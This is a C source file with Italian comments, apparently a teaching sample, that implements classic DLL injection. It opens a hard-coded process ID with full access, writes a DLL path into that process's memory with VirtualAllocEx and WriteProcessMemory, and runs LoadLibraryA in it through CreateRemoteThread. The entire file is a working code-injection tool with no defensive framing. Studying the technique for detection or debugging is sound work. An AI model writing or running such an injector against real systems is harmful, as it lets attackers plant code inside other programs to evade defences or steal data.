// Programma d'esempio per DLL Injection utilizzando "CreateRemoteThread"

//#include "pch.h"
#include <windows.h>
#include <stdio.h>

int main(int argc, TCHAR* argv[]){

    char buffer[] = "C:\\Users\\z3r0\\Desktop\\Doing\\inject.dll";

    // Ottiene l'handle al processo utilizzando l'ID del processo.
    int procID = 2192;
    HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, false, procID);
    if(process == NULL){
        printf("Non e` stato possibile ottenere un handle al processo.");
        getchar();
        return -0x1;
    }

    // Ottiene l'indirizzo della funzione "LoadLibraryA"
    LPVOID addr = (LPVOID) GetProcAddress(GetModuleHandle((const char*)"kernel32.dll"), "LoadLibraryA");
    if(addr == NULL){
        printf("Non e` stato possibile ottenere l'indirizzo della funzione \'LoadLibraryA\'.");
        getchar();
        return -0x1;
    }

    // Alloca una nuova regione di memoria dentro lo spazio degli indirizzi del processo.
    LPVOID arg = (LPVOID) VirtualAllocEx(process, NULL, strlen(buffer), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if(arg == NULL){
        printf("Non e` stato possibile scrive la regione di memoria per mantenere il percorso della DLL.");
        getchar();
        return -0x1;
    }

    // Scrive l'argomento a "LoadLibraryA" nella regione di memoria del processo appena allocata.
    int n = WriteProcessMemory(process, arg, buffer, strlen(buffer), NULL);
    if(n == 0x0){
        printf("Non e` stato possibile scrivere nello spazio degli indirizzi del processo.");
        getchar();
        return -0x1;
    }

    // Inietta la DLL dentro lo spazio degli indirizzi del processo
    HANDLE threadID = CreateRemoteThread(process, NULL, 0x0, (LPTHREAD_START_ROUTINE) addr, arg, NULL, NULL);
    if(threadID == NULL){
        printf("Non e` stato possibile creare il thread remoto.");
        getchar();
        return -0x1;
    } else {
        printf("Thread remoto creato con successo.\n");
    }

    // Chiude l'handle al processo poiche`abbiamo gia`iniettato la DLL
    CloseHandle(process);
    getchar();

    return 0x0;
}

